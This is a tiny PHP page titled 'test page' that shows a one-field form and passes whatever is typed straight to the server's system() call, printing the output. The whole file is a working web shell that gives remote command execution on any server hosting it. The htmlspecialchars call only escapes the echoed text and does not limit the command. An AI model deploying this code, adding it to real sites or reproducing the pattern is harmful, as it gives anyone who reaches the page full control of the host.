<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN"
	"http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" lang="ja" xml:lang="ja">
<head>
    <meta http-equiv="Content-Type" content="text/html;charset=utf-8" />
    <meta http-equiv="Content-Style-Type" content="text/css" />
    <meta http-equiv="Content-Script-Type" content="text/javascript" />
    <title>test page</title>
</head>

<body>
<form method="post" action="index.php">
<input name="command" type="text" size="40">
</form>

<?php
$command = htmlspecialchars( $_POST[ 'command' ] );
echo $command;
if ( $command ) {
  echo '<pre>';
  system( $command, $retval );
  print $retval;
  echo '</pre>';
};
?>
</body>
</html>
